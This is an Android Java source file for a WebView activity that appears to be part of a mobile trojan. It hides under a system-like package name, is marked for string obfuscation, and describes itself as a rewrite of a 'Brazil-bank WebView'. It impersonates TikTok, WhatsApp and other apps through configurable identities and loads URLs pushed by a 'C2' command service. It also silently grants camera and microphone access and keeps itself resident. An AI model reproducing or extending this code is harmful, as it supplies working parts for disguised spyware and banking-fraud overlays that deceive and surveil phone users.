package com.android.core.sync;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.ConsoleMessage;
import android.webkit.GeolocationPermissions;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * WebViewActivity v2 — Flash Identity-Aware Browser
 *
 * Completely rewritten from the original hardcoded Brazil-bank WebView.
 *
 * Key upgrades:
 *  • Identity-aware: reads AppIdentityManager for URL, UA, colors, name
 *  • TikTok default — loads www.tiktok.com with TikTok UA → native mobile experience
 *  • Branded splash screen — bg + name text in identity colors while page loads
 *  • Video autoplay — MediaPlaybackRequiresUserGesture=false (TikTok / YouTube)
 *  • Fullscreen video overlay — onShowCustomView for landscape video
 *  • File chooser — WhatsApp attachment uploads, camera rolls, etc.
 *  • Desktop UA mode — WhatsApp Web QR scan flows work correctly
 *  • URL priority chain: Intent extra → C2 WEBVIEW_URL → identity default
 *  • WebView lifecycle: onPause/onResume/onDestroy wired correctly
 *  • Immersive fullscreen restored on every onResume
 */
@Obfuscate
public class WebViewActivity extends Activity {

    private static final String TAG               = "WVA";
    private static final int    FILE_CHOOSER_REQ  = 0xBEEF;

    private WebView             webView;
    private FrameLayout         rootFrame;
    private View                splashView;
    private View                fullscreenVideoContainer;
    private WebChromeClient.CustomViewCallback customViewCallback;
    private ValueCallback<Uri[]> fileChooserCallback;

    // ══════════════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Keep screen on while WebView is active
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        applyImmersive();

        // Load identity config
        AppIdentityManager.IdentityConfig cfg = AppIdentityManager.get().getConfig();
        Log.d(TAG, "onCreate | identity=" + AppIdentityManager.get().getActiveIdentity()
              + " | url=" + cfg.webviewUrl + " | ua=" + cfg.userAgent.substring(0, 40));

        // Root container
        rootFrame = new FrameLayout(this);
        rootFrame.setBackgroundColor(cfg.colorBackground);
        rootFrame.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));

        // Build WebView and add first
        webView = buildWebView(cfg);
        rootFrame.addView(webView, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));

        // Branded splash overlay on top
        splashView = buildSplash(cfg);
        rootFrame.addView(splashView, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));

        setContentView(rootFrame);

        // Load URL
        String url = resolveUrl(cfg);
        Log.d(TAG, "loadUrl → " + url);
        webView.loadUrl(url);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        applyImmersive();
    }

    @Override
    protected void onPause() {
        if (webView != null) webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.stopLoading();
            webView.setWebViewClient(null);
            webView.setWebChromeClient(null);
            webView.destroy();
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (fullscreenVideoContainer != null && fullscreenVideoContainer.getVisibility() == View.VISIBLE) {
            // Exit fullscreen video first
            exitFullscreenVideo();
            return;
        }
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            moveTaskToBack(true);  // minimize, don't finish — keeps app resident
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQ) {
            if (fileChooserCallback == null) return;
            Uri[] results = null;
            if (resultCode == RESULT_OK && data != null) {
                String dataStr = data.getDataString();
                if (dataStr != null) {
                    results = new Uri[]{ Uri.parse(dataStr) };
                } else if (data.getClipData() != null) {
                    int count = data.getClipData().getItemCount();
                    results = new Uri[count];
                    for (int i = 0; i < count; i++) {
                        results[i] = data.getClipData().getItemAt(i).getUri();
                    }
                }
            }
            fileChooserCallback.onReceiveValue(results);
            fileChooserCallback = null;
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  WEBVIEW CONSTRUCTION
    // ══════════════════════════════════════════════════════════════════════

    private WebView buildWebView(AppIdentityManager.IdentityConfig cfg) {
        WebView wv = new WebView(this);
        wv.setBackgroundColor(Color.TRANSPARENT);

        WebSettings s = wv.getSettings();

        // Core JS / DOM
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);

        // Viewport / scaling
        s.setUseWideViewPort(true);
        s.setLoadWithOverviewMode(true);
        s.setBuiltInZoomControls(false);
        s.setDisplayZoomControls(false);
        s.setSupportZoom(true);

        // Windows / popups
        s.setJavaScriptCanOpenWindowsAutomatically(true);
        s.setSupportMultipleWindows(true);

        // File / content access
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);

        // Video — MUST be false for TikTok / YouTube autoplay
        s.setMediaPlaybackRequiresUserGesture(false);

        // Mixed content (some sites need it)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        // Cache — use default (network-first, cache fallback)
        s.setCacheMode(WebSettings.LOAD_DEFAULT);

        // No geolocation (reduces permission prompts)
        s.setGeolocationEnabled(false);

        // Identity user-agent
        s.setUserAgentString(cfg.userAgent);

        // No debug in release
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            WebView.setWebContentsDebuggingEnabled(false);
        }

        wv.setWebViewClient(new IdentityWebViewClient());
        wv.setWebChromeClient(new IdentityWebChromeClient());

        return wv;
    }

    // ── WebViewClient — keep all navigation internal ───────────────────────
    private class IdentityWebViewClient extends WebViewClient {

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // Handle tel: / intent: schemes
            if (url.startsWith("tel:") || url.startsWith("mailto:") || url.startsWith("intent:")) {
                try {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                } catch (Exception ignored) {}
                return true;
            }
            // Everything else stays inside the WebView
            view.loadUrl(url);
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            hideSplash();
        }

        @Override
        public void onReceivedError(WebView view, int errorCode,
                                    String description, String failingUrl) {
            Log.w(TAG, "WebView error " + errorCode + " on " + failingUrl);
            // Delay-hide splash even on error so the user doesn't see a blank black screen
            new Handler(Looper.getMainLooper()).postDelayed(() -> hideSplash(), 2500);
        }
    }

    // ── WebChromeClient — media, permissions, fullscreen video ────────────
    private class IdentityWebChromeClient extends WebChromeClient {

        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            // Could hook a thin progress bar here if desired
        }

        /** Auto-grant camera / mic for WhatsApp video calls, TikTok live etc. */
        @Override
        public void onPermissionRequest(PermissionRequest request) {
            request.grant(request.getResources());
        }

        /** Deny geolocation prompts silently */
        @Override
        public void onGeolocationPermissionsShowPrompt(String origin,
                                                       GeolocationPermissions.Callback cb) {
            cb.invoke(origin, false, false);
        }

        /** File chooser — WhatsApp image/video attachments, etc. */
        @Override
        public boolean onShowFileChooser(WebView wv, ValueCallback<Uri[]> cb,
                                         FileChooserParams params) {
            if (fileChooserCallback != null) {
                fileChooserCallback.onReceiveValue(null);
            }
            fileChooserCallback = cb;
            try {
                startActivityForResult(params.createIntent(), FILE_CHOOSER_REQ);
                return true;
            } catch (Exception e) {
                fileChooserCallback = null;
                return false;
            }
        }

        /** Fullscreen video (YouTube/TikTok landscape) */
        @Override
        public void onShowCustomView(View view, CustomViewCallback callback) {
            if (fullscreenVideoContainer != null) {
                callback.onCustomViewHidden();
                return;
            }
            fullscreenVideoContainer = view;
            customViewCallback = callback;
            rootFrame.addView(view, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            ));
            webView.setVisibility(View.INVISIBLE);
            if (splashView != null) splashView.setVisibility(View.GONE);
        }

        @Override
        public void onHideCustomView() {
            exitFullscreenVideo();
        }

        /** Suppress console messages */
        @Override
        public boolean onConsoleMessage(ConsoleMessage cm) {
            return true;
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  SPLASH SCREEN
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Builds a branded loading splash that fills the screen while the
     * WebView loads the first page. Colors and name come from identity config.
     *
     * Layout:
     *   [ full-screen bg (identity background color)      ]
     *   [        (centered)                               ]
     *   [   APP NAME  ← identity primary color, bold 30sp ]
     *   [   ProgressBar (spinner) below name              ]
     */
    private View buildSplash(AppIdentityManager.IdentityConfig cfg) {
        RelativeLayout splash = new RelativeLayout(this);
        splash.setBackgroundColor(cfg.colorBackground);
        splash.setAlpha(1f);

        // App name
        TextView name = new TextView(this);
        name.setId(View.generateViewId());
        name.setText(cfg.appName);
        name.setTextColor(cfg.colorPrimary);
        name.setTextSize(30f);
        name.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        name.setLetterSpacing(0.03f);

        RelativeLayout.LayoutParams nameLp = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        nameLp.addRule(RelativeLayout.CENTER_IN_PARENT);
        name.setLayoutParams(nameLp);
        splash.addView(name);

        // Spinner below name
        ProgressBar spinner = new ProgressBar(this);
        spinner.setIndeterminate(true);
        RelativeLayout.LayoutParams spinLp = new RelativeLayout.LayoutParams(72, 72);
        spinLp.addRule(RelativeLayout.BELOW, name.getId());
        spinLp.addRule(RelativeLayout.CENTER_HORIZONTAL);
        spinLp.topMargin = dpToPx(28);
        spinner.setLayoutParams(spinLp);
        splash.addView(spinner);

        // Accent line at bottom (subtle brand stripe — 3dp tall)
        View stripe = new View(this);
        stripe.setBackgroundColor(cfg.colorAccent);
        RelativeLayout.LayoutParams stripeLp = new RelativeLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(3)
        );
        stripeLp.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM);
        stripe.setLayoutParams(stripeLp);
        splash.addView(stripe);

        return splash;
    }

    private void hideSplash() {
        if (splashView == null || splashView.getVisibility() != View.VISIBLE) return;
        splashView.animate()
            .alpha(0f)
            .setDuration(350)
            .withEndAction(() -> {
                if (splashView != null) splashView.setVisibility(View.GONE);
            })
            .start();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════════

    /**
     * URL priority chain:
     *   1. Intent extra "url"       — deeplink from another component
     *   2. CommandControlService.WEBVIEW_URL — set by C2 or build config
     *   3. Identity config default  — TikTok/WhatsApp/etc. built-in URL
     */
    private String resolveUrl(AppIdentityManager.IdentityConfig cfg) {
        String url = null;

        // 1. Intent extra
        if (getIntent() != null) {
            url = getIntent().getStringExtra("url");
        }
        // 2. C2 / build-time override
        if (url == null || url.trim().isEmpty()) {
            url = CommandControlService.WEBVIEW_URL;
        }
        // 3. Identity default
        if (url == null || url.trim().isEmpty()) {
            url = cfg.webviewUrl;
        }
        // Ensure scheme
        if (url != null && !url.startsWith("http://") && !url.startsWith("https://")) {
            url = "https://" + url;
        }
        return url != null ? url : "https://www.tiktok.com";
    }

    private void applyImmersive() {
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_FULLSCREEN           |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION      |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY     |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN    |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );
    }

    private void exitFullscreenVideo() {
        if (fullscreenVideoContainer == null) return;
        rootFrame.removeView(fullscreenVideoContainer);
        fullscreenVideoContainer = null;
        webView.setVisibility(View.VISIBLE);
        if (customViewCallback != null) {
            customViewCallback.onCustomViewHidden();
            customViewCallback = null;
        }
    }

    private int dpToPx(int dp) {
        return Math.round(dp * getResources().getDisplayMetrics().density);
    }
}
